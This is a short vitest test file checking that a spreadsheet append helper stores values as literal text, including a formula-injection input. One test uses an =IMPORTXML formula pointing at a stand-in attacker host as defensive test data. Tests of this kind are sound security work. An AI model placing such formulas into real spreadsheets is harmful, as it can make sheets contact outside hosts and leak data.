import { describe, expect, it } from 'vitest';
import { SheetFormula, loadSources, makeSheet, type CellValue } from './apps-script-sandbox';

describe('writes are stored as literal text', () => {
  function append(values: string[]) {
    const rows: CellValue[][] = [];
    const sandbox = loadSources(['utils.js']);
    sandbox.appendRecord(makeSheet(rows), values);
    return rows[0];
  }

  it('keeps a date and a number as the text they were', () => {
    const row = append(['2026-03-04', '3720']);
    expect(row[0]).toBe('2026-03-04');
    expect(row[1]).toBe('3720');
  });

  it('stores a value beginning with = as text, never a live formula', () => {
    const row = append(['=IMPORTXML("https://evil.test","//a")']);
    expect(row[0]).not.toBeInstanceOf(SheetFormula);
    expect(row[0]).toBe('=IMPORTXML("https://evil.test","//a")');
  });

  it('writes an unset value as an empty cell', () => {
    expect(append([''])[0]).toBe('');
  });
});
